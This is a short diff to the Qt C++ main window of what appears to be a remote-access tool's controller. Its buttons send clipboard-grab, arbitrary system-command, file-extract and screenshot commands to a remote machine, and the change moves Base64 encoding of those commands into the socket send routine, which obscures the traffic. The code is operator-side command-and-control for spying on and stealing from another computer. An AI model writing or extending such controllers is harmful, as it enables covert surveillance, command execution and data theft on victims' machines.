@@ -93,7 +93,7 @@ void MainWindow::on_clipboardButton_clicked()
     }
 
     this->statusLabel->setText("Sending CLP to " + this->selectedMachineName);
-    QString cmd = QString("CLP").toUtf8().toBase64();
+    QString cmd = QString("CLP");
     resetStatusTimer(3);
 
     this->networdHandler = CLP;
@@ -137,7 +137,7 @@ void MainWindow::on_sendCmdButton_clicked()
         return;
     }
     this->statusLabel->setText("Sending SYS:" + this->ui->cmdLine->text());
-    QString cmd = ("SYS:" + this->ui->cmdLine->text()).toUtf8().toBase64();
+    QString cmd = ("SYS:" + this->ui->cmdLine->text());
 
     resetStatusTimer(3);
     sendCmd(cmd);
@@ -154,7 +154,7 @@ void MainWindow::on_extractButton_clicked()
       return;
    }
    this->statusLabel->setText("Sending EXT:" + this->ui->fileLine->text());
-   QString cmd = ("EXT:" + this->ui->fileLine->text()).toUtf8().toBase64();
+   QString cmd = ("EXT:" + this->ui->fileLine->text());
    resetStatusTimer(3);
    sendCmd(cmd);
 }
@@ -169,7 +169,7 @@ void MainWindow::on_screenshotButton_clicked()
      return;
   }
   this->statusLabel->setText("Sending SCR");
-  QString cmd = QString("SCR").toUtf8().toBase64();
+  QString cmd = QString("SCR");
   resetStatusTimer(3);
   sendCmd(cmd);
 }
@@ -319,7 +319,7 @@ void MainWindow::read(){
  * @param cmd The command to send to the remote machine
  */
 void MainWindow::sendCmd(QString cmd){
-  this->clientSocket->write((cmd + "\n").toUtf8());
+  this->clientSocket->write((cmd + "\n").toUtf8().toBase64());
   this->clientSocket->flush();
 }
 
